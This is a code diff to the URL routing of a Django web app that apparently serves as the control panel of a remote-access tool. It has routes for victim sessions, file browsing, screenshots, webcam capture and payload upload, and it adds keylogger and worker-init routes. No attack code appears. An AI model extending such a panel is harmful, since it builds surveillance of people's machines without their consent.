@@ -24,7 +24,8 @@ from server import views
 urlpatterns = [
     url(r'^admin/', admin.site.urls),
     url(r'^sessions$', views.sessions, name="sessions"),
-    url(r'^sessions/(\d+)$', views.session, name="session"),
+    url(r'^sessions/(\d+)/?$', views.session, name="session"),
+    url(r'^sessions/(\d+)/session_close$', views.session_close, name="session_close"),
     url(r'^sessions/(\d+)/session_information$', views.session_information, name="session_information"),
     url(r'^sessions/(\d+)/session_explorer$', views.session_explorer, name="session_explorer"),
     url(r'^sessions/(\d+)/session_screenshot$', views.session_screenshot, name="session_screenshot"),
@@ -32,8 +33,10 @@ urlpatterns = [
     url(r'^sessions/(\d+)/session_webcam$', views.session_webcam, name="session_webcam"),
     url(r'^sessions/(\d+)/action_webcam$', views.action_webcam, name="action_webcam"),
     url(r'^sessions/(\d+)/session_live$', views.session_live, name="session_live"),
+    url(r'^sessions/(\d+)/session_keylogger$', views.session_keylogger, name="session_keylogger"),
     url(r'^upload_payload$', views.upload_payload, name="upload_payload"),
     url(r'^init$', views.init, name="init"),
+    url(r'^init_worker$', views.init_worker, name="init_worker"),
     url(r'^jobs$', views.jobs, name="jobs"),
     url(r'^$', views.home, name="home")
 ]
